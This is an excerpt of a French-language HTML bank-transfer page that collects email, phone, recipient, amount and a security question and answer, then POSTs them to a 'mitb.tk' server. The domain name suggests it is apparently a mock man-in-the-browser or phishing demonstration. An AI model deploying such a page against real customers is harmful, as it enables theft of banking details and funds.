...
<body class="pages_transaction" onload="changeButton()">
    ...
    <form action="#">
        <div class="transac-input">
            <label for="courriel">Courriel</label> <input type="email" id="courriel">
        </div>
        <div class="transac-input">
            <label for="tel">Téléphone #</label> <input type="tel" id="tel" placeholder="123-123-1234" pattern="[0-9]{3}-[0-9]{3}-[0-9]{4}">
        </div>
        <div class="transac-input">
        ...
        <div class="transac-input">
            <label for="destinataire">Destinataire</label> <input type="list" id="destinataire">
        </div>
        <div class="transac-input">
                <label for="montant">Montant (CAD$)</label> <input type="number" id="montant" step="0.01">
        </div>
        <div class="transac-input">
            <label for="question">Question de sécurité</label> <input type="text" id="question">
        </div>
        <div class="transac-input">
            <label for="reponse">Réponse</label> <input type="text" id="reponse">
        </div>
        <div id="end-buttons">
            <button class="retour-transac"><a href="https://mitb.tk/compte.php">Retour</a></button>
            <button onclick="envoyerVirement()" class="envoyer-money">Envoyer</button>
        </div>
    </form>
...
<script>
    ...
    function envoyerVirement(){
            ...
            xhttp.open('POST', 'https://mitb.tk/virementenvoyer.php', true);
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhttp.send("courriel="+courriel+"&tel="+tel+"&compte="+compte+"&destinataire="+destinataire+"&montant="+montant+"&question="+question+"&reponse="+reponse);
            
            alert("Virement envoyer");
    }    
